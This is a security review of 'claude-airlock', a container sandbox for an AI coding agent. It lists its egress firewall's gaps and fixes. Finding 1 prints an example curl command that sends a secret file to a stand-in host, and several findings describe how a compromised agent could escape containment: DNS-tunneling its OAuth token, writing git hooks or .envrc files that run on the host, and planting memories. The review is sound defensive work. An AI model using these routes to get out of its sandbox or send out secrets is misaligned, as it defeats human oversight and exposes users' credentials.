# Security review — claude-airlock

*Reviewed: 2026-07-13. Scope: the launcher (`bin/claude-airlock`), the container image
and firewall (`image/`), the install/doctor scripts, shell integration, config parsing,
and the supporting documentation. This is a design + code review, not a live pen-test —
no attempt was made to actually break out of a running box.*

## Summary

claude-airlock is a well-constructed sandbox. The core containment claim — a
default-DROP egress firewall on **both** address families, enforced inside the container
by root before an unprivileged agent ever runs, with a live self-verify and a matching CI
gate — holds up under reading. The launcher keeps every grant (secrets, shares, egress
posture) in a host-side state dir the box cannot reach, and the box-writable
`.airlock/config` can only *request*, never *approve*. Several of the sharpest risks (DNS
exfiltration, the shared-memory influence channel, resolve-once IP staleness) are already
named honestly in the README and in code comments.

This document does **not** re-litigate those. It records the gaps that are *not* yet
written down, restates the accepted risks with their full blast radius so they can be
signed off deliberately, and lists documentation/process items that are missing for a
project whose whole value proposition is "trust this to contain a misbehaving agent."

Nothing here is a break of the core network-containment moat. The findings are, in order:
two under-documented **influence/exfiltration channels** that bypass the firewall by
design, a handful of **host-hygiene** issues (secrets on the process table, no resource
limits, supply-chain trust in the build), and **process/documentation** gaps.

Severity is the reviewer's own rating and is deliberately conservative. "Accepted" means
the design already made this trade knowingly; it is repeated here only so the acceptance
is explicit and complete.

| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1 | IP-based allowlist ignores CDN/host co-tenancy (SNI not inspected) | Medium–High | **Documented** (README) |
| 2 | Poisoned workspace files execute on the host (git hooks, direnv, build scripts) | Medium–High | **Documented** (README) |
| 3 | OAuth token + secrets exposed on the host process table via `-e KEY=VALUE` | Medium | **Fixed** — `--env-file` (0600) |
| 4 | The long-lived OAuth token is itself exfiltratable over the accepted DNS channel | Medium | **Documented** (README) |
| 5 | Supply-chain: image build trusts `curl \| bash` + unpinned tarballs/base | Medium | Open — recommended |
| 6 | No resource limits — a box can DoS the host | Low | **Fixed** — `--pids-limit`/`--memory` |
| 7 | Path→slug mapping is not injective (state-dir collisions) | Low | Open — deferred (not cheap) |
| 8 | Stale images = unpatched CVEs; no refresh guidance | Low | Partly documented (SECURITY.md) |
| 9 | Literal secrets stored plaintext + land in shell history when set | Low | **Documented** (README) |
| 10 | No `SECURITY.md` / disclosure policy on a public repo | Info | **Fixed** — `SECURITY.md` added |
| A | DNS exfiltration remains open (narrowed, not closed) | Accepted | Documented |
| B | Shared `memory/` is an influence channel out of the box | Accepted | Documented |
| C | Allowlist domains resolved once at box start (IP rotation) | Accepted | Documented |
| D | Class B — destructive *authorized* actions are not contained | Accepted | Documented |

> **Remediation log (2026-07-13).** Findings **3** and **6** are fixed in the launcher:
> the OAuth token and injected secrets now go to the engine via a mode-0600 `--env-file`
> that is removed on exit (off the process table), and a default `--pids-limit` (4096,
> overridable) plus an opt-in `--memory` cap were added — both covered by new tests in
> `test/hardening.bats`. Findings **1, 2, 4, 9** are now written up in the README's
> "Security model" section, and **10** is addressed by the new root `SECURITY.md`. Findings
> **5, 7, 8** remain open; see their entries and the recommendations for why 7 in
> particular was deferred rather than rushed.

---

## What the sandbox does and does not defend

Stated plainly so the findings below sit in context.

**Contained (the moat holds):**

- Outbound network is default-DROP on IPv4 and IPv6; only allowlisted destinations on
  TCP/443 (plus SSH/22 to GitHub and DNS/53 to the configured resolvers) leave the box.
  The firewall runs as root before the agent starts, the agent runs as non-root `dev`
  with no capabilities and `no-new-privileges`, and the firewall self-verifies both
  directions on every family the box can use.
- The host's `~/.claude` credentials, the container/engine socket, and other projects are
  not mounted. Grants live host-side and the box cannot approve its own.
- Under the default rootless Podman, container "root" is only root inside the box's own
  user namespace, so even a firewall-init compromise cannot reach host root.

**Not contained (by design — this is the important part):**

- Anything the box writes into a directory the host later *executes from* or *reads into a
  trusted context* (findings 1–2, B). The firewall cannot see a file write.
- Data smuggled through a channel the allowlist permits: DNS query names (A), or a legit
  allowed IP that also fronts attacker content (1).
- Destructive but authorized actions — a bad `terraform destroy`, force-push, `rm` — if
  the box holds a credential that can do them (D). Isolation is the wrong tool; scope the
  credential instead.

---

## Findings

### 1. The allowlist matches destination IPs, so it inherits CDN/shared-host co-tenancy — Medium–High (new)

`init-firewall.sh` resolves each allowlisted domain to A/AAAA records and stores the
**IP addresses** in an ipset; the OUTPUT rules accept TCP/443 to any IP in that set. The
firewall never inspects the TLS SNI or HTTP Host header — it cannot, at that layer.

Consequently, **any domain that resolves to an IP already in the allowlist is reachable**,
regardless of whether it was ever approved. Modern registries sit behind large shared
CDNs (npm and PyPI's `files.pythonhosted.org` front through providers like Fastly and
Cloudflare, whose edge IPs are anycast and shared across enormous numbers of unrelated
sites). The moment a project enables the `npm`, `pypi`, or `dev` egress group, the
allowlist effectively contains a slice of a shared CDN's address space, and an agent can:

```
# evil.example is hosted on the same CDN as an allowlisted registry, so it
# resolves to an IP already in `allowed-domains`. The firewall sees only the IP.
curl -sk https://evil.example/collect -d "@$SECRET_FILE"
```

The connection is permitted; the CDN routes by SNI to the attacker's backend; data
leaves. This is a genuine exfiltration channel, not a theoretical one, and it widens with
every group enabled. Even in `minimal` mode the surface is non-zero if `api.anthropic.com`
shares CDN IPs with third-party sites.

This is a strictly stronger statement than the documented "resolve-once IP rotation"
limitation (C): the problem is not that IPs go stale, it is that an IP identifies a CDN
*edge*, not a *site*.

**Mitigations / recommendations:**

- Document it. Users enabling `dev`/`npm`/`pypi` egress should understand they are opening
  a broad co-tenancy channel, not just "the registries."
- For real closure, egress filtering would need to move to L7 (an SNI-aware filtering
  proxy the box is forced through, e.g. a transparent MITM or an allowlisting forward
  proxy), which is a substantial design change. Note it as a known limitation for now.
- Prefer keeping projects in `minimal` and adding narrow `egress =` domains over flipping
  the whole `dev` group on.

### 2. Files the box writes into the workspace execute on the host later — Medium–High (partly implied)

The current project is mounted **read-write at its real host path** (`-v
"$WORKSPACE:$WORKSPACE:rw"`), including `.git/`. This is necessary and correct for the box
to do work. But it means the box can write any file the host will later *run itself,
unsandboxed, with your real credentials and no firewall*:

- `.git/hooks/*` — executed on the next host `git commit`, `git push`, `git merge`, …
- `.envrc` — executed by direnv the next time you `cd` into the directory
- `Makefile`, `package.json` `scripts`, `pyproject.toml`/`setup.py`, `conftest.py`,
  `tox.ini`, `.vscode/tasks.json`, pre-commit configs, `node_modules/.bin` shims …

None of these touch the network, so the egress firewall never sees them. They are the
same *class* of risk the README already documents for shared `memory/` (finding B), but
broader and less obvious — the memory channel is called out explicitly while this one is
only implied by the general "Class B" framing. A user who has read the memory warning may
still not realize that `make test` on the host after an untrusted box session runs
box-authored code.

**Mitigations / recommendations:**

- Document it prominently alongside the memory warning: *treat a workspace a box has
  touched the way you'd treat a pulled PR from a stranger — review before you build, commit,
  or `cd` with direnv active.*
- Consider a host-side helper that diffs security-sensitive paths (`.git/hooks`, `.envrc`,
  build manifests) after an untrusted session.
- This is inherent to "the agent edits your repo" and cannot be fully closed without
  giving up the rw workspace; the goal is informed consent, not elimination.

### 3. The OAuth token and injected secrets are visible on the host process table — Medium (new)

The auth token and every per-project secret are passed to the engine as command-line
arguments:

```
-e "CLAUDE_CODE_OAUTH_TOKEN=$OAUTH_TOKEN"
args+=( -e "$_skey=$_resolved" )     # resolved `pass` secrets
args+=( -e "$_skey=$_sval" )         # literal secrets
```

These become argv of the `podman`/`docker` process and are therefore readable from
`/proc/<pid>/cmdline` and `ps auxe`. On a single-user host the exposure is limited to
other processes running as the same user (still meaningful — any tool, script, or
dependency you run can scrape them). On a **multi-user host**, whether other users can read
them depends on the kernel's `hidepid` mount option for `/proc`, which on many
distributions defaults to permitting it. The `pass` integration carefully keeps secrets
encrypted at rest and then discloses them on the command line at launch, which undercuts
much of that care.

**Mitigations / recommendations:**

- Pass secrets and the token via `--env-file` (a mode-600 temp file) or on the engine's
  stdin, rather than `-e KEY=VALUE`. Both Podman and Docker support `--env-file`.
- If keeping `-e`, document that the host should not be a shared/multi-user machine, and
  that same-user processes can read the token.

### 4. The long-lived OAuth token can be exfiltrated over the accepted DNS channel — Medium (implied)

Finding (A) is documented and accepted: DNS query names remain a low-bandwidth exfil
channel through the configured resolver. What is not spelled out is that **the single
most valuable secret in the box is sitting right there to be exfiltrated over it** — the
`CLAUDE_CODE_OAUTH_TOKEN` (`~1-year` lifetime, full subscription API access) is in the
box's own environment on every launch, trusted-project or not. A compromised box can read
its own `$CLAUDE_CODE_OAUTH_TOKEN` and drip it out as DNS labels. An `sk-ant-oat…` token
is short enough to leak in a handful of queries.

The blast radius is bounded (subscription quota abuse / account API access, not host
compromise or metered billing), but the acceptance of the DNS channel should be made with
the knowledge that the token is in scope for it.

**Mitigations / recommendations:**

- Note explicitly in the DNS-limitation text that the OAuth token itself is exfiltratable
  this way, and that token rotation (`claude setup-token` again) is the response if a box
  is believed compromised.
- Longer term, DNS egress could be pinned to a resolver that logs/rate-limits, or query
  volume anomaly-detected — out of scope for the MVP but worth a line.

### 5. The image build trusts remote code with no integrity pinning — Medium (new)

The images are built by fetching and executing remote artifacts without checksum or
signature verification:

- `RUN curl -fsSL https://claude.ai/install.sh | bash` (base image) — classic
  curl-pipe-bash; whatever that URL serves at build time is executed as the image build.
- Node.js is downloaded as a tarball from `nodejs.org` and unpacked with no SHA/GPG check;
  the version is "newest v24.x at build time," so builds are not reproducible.
- `FROM debian:trixie-slim` is a moving tag, not pinned by digest.

Apt packages are covered by apt's own signature chain, so those are fine. The exposure is
the two `curl` fetches and the floating base: a compromise (or a build-time MITM on a
network without the protections the tool assumes) of any of those upstreams silently
yields a poisoned sandbox image — and this is the image you are trusting to contain an
agent. For a security tool this is worth hardening or, at minimum, naming.

**Mitigations / recommendations:**

- Pin the base image by digest (`debian:trixie-slim@sha256:…`).
- Pin the Node version and verify it against the published `SHASUMS256.txt` (Node signs
  these) before unpacking.
- For the Claude installer, pin/verify if upstream offers a checksum, or at least document
  that image builds should run on a trusted network.

### 6. No resource limits — a box can exhaust host resources — Low (new)

The engine is invoked with no `--memory`, `--pids-limit`, or `--cpus`. A compromised or
merely runaway agent can fork-bomb, allocate until the host OOMs, or peg CPU. Under
rootless Podman the damage is bounded to the invoking user's limits, but that can still
render the host unusable (availability, not confidentiality). The tmpfs-backed
`$AIRLOCK_TMP` and bare `/tmp` also let a box consume host RAM via tmpfs writes.

**Recommendation:** add conservative defaults (`--pids-limit`, `--memory`, maybe
`--cpus`), overridable via host config. Low severity but cheap to add.

### 7. Path→slug mapping is not injective — Low (new)

`slug="$(printf '%s' "$WORKSPACE" | sed 's#[^a-zA-Z0-9]#-#g; s#^-*##')"` maps every
non-alphanumeric run to `-`, so distinct project paths can collide onto the same slug —
e.g. `~/dev/foo-bar` and `~/dev/foo/bar` both become `…-foo-bar`. Colliding projects share
one `STATE_DIR`: secrets, egress approvals, folder-share approvals, and the session lock.
The practical effect is that one project's host-approved grants (a secret, an approved
`egress = evil.com`) could silently apply to a *different* project's box. Probability is
low on a normal layout, but the failure is silent and security-relevant (grant bleed).

**Recommendation:** derive the slug from a collision-resistant transform (e.g. append a
short hash of the full path, or percent-style encoding) so distinct paths never share
state. Keep the human-readable prefix for legibility.

### 8. Images pin no rebuild cadence — stale images accumulate CVEs — Low (new)

`make install` builds once. There is no mechanism or documented guidance to rebuild for
security updates, so a box can run months-old Debian/Node/Claude with known CVEs while the
user believes "airlock keeps me safe." The moat is network isolation, so an unpatched CVE
inside is somewhat mitigated — but local-privilege and parsing bugs in the box's tooling
still matter (the firewall init parses `dig`/`curl`/`jq` output as root).

**Recommendation:** document a refresh cadence and add a `make update`/`airlock rebuild`
that rebuilds `--no-cache` (or with `--pull`).

### 9. Literal secrets are stored plaintext and enter shell history when set — Low (partly implied)

`airlock secret set KEY VALUE` writes the literal value to `$STATE_DIR/secrets` (mode 600,
good) but the value is also (a) typed on the command line, so it lands in shell history and
the host process table at set-time, and (b) stored in plaintext on disk. The `pass:PATH`
form avoids both and should be the documented default; the docs mention `pass:` but do not
steer users away from the literal form for real secrets.

**Recommendation:** recommend `pass:PATH` as the norm in the README/help; optionally read
literal values from a prompt/stdin instead of argv.

### 10. No `SECURITY.md` / disclosure policy on a public repo — Info (new)

The `.gitignore` comments state the repo is public, and the project's entire purpose is
security. There is no `SECURITY.md`, no vulnerability-disclosure contact, and no
consolidated threat-model doc (the model is spread across README prose and code comments).

**Recommendation:** add a `SECURITY.md` with a disclosure channel, and link this review /
a threat-model section from the README.

---

## Accepted risks (restated for explicit sign-off)

These are already documented in the README and/or code. They are correct trade-offs for
the tool's goals; listed here only so the acceptance is complete and in one place.

- **A — DNS exfiltration is narrowed, not closed.** DNS is pinned to the box's configured
  resolvers, killing `dig @attacker-ns` and destination choice, but query *names* can
  still tunnel data through your legitimate resolver to a hostile authoritative server. No
  resolver allowlist can prevent this. Treat DNS as a permanently-open low-bandwidth
  channel. (See also finding 4 — the OAuth token is in scope for it.)

- **B — shared `memory/` is an influence channel.** `memory/` is mounted rw so the box can
  save memories; the *unsandboxed host* agent auto-loads those files every session. A
  compromised box can plant a memory the host later acts on, with no network involved.
  Documented, and tunable via `AIRLOCK_SHARE_MEMORY=ro|off`. (Finding 2 is the broader
  cousin of this and deserves equal billing.)

- **C — allowlist domains are resolved once, at box start.** If an allowed host rotates
  IPs mid-session the new IPs are not permitted until the next launch. An availability
  limitation; also the narrower version of finding 1.

- **D — Class B destructive-but-authorized actions are not contained.** Isolation does not
  stop a bad `terraform destroy` or force-push if the box holds a capable credential. The
  documented mitigation — keep write credentials out of the box (read-only/CI-scoped),
  branch protection, human-reviewed pushes — is the right one and should be followed.

---

## Recommendations, prioritized

**Documentation (cheap, do first):**

1. Document the CDN co-tenancy channel (1) wherever `airlock egress dev` is described.
2. Add a "poisoned workspace files" warning (2) next to the existing memory warning —
   review a touched repo before you build/commit/`cd` into it.
3. State that the OAuth token is exfiltratable over DNS (4) and that rotation is the
   response to a suspected box compromise.
4. Add `SECURITY.md` + a consolidated threat-model section (10).
5. Steer secret storage to `pass:PATH` and warn about the literal form (9).

**Code / config (low effort, meaningful):**

6. Pass the token and secrets via `--env-file` instead of `-e KEY=VALUE` (3).
7. Add default `--pids-limit` / `--memory` (6).
8. Make the state slug collision-resistant (7).

**Build / process:**

9. Pin the base image by digest and verify the Node tarball checksum (5).
10. Provide and document an image-refresh path (8).

**Larger, optional:**

11. If IP-level egress ever proves insufficient, move filtering to an SNI-aware proxy (1).
